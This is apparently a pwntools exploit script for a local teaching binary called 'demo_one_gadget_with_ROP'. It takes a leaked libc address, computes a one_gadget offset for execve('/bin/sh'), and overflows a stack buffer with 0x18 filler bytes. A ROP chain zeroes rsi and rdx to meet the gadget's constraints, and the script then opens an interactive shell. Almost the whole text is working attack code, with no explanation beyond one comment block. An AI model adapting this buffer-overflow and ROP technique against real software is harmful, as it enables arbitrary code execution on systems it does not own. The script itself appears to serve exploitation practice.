#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_one_gadget_with_ROP')

r.recvuntil("Your libc: ")
libc = int(r.recv(14), 16) - 0x64e10
info(f"libc: {hex(libc)}")

"""
0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""
gdb.attach(r)
pop_rdx_rbx_ret = libc + 0x162866 # pop rdx ; pop rbx ; ret
pop_rsi_ret = libc + 0x27529 # pop rsi ; ret

if len(sys.argv) > 1:
    r.send(b'A'*0x18 + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc + 0xe6c84))
else:
    r.send(b'A'*0x18 + p64(libc + 0xe6c84))

r.interactive()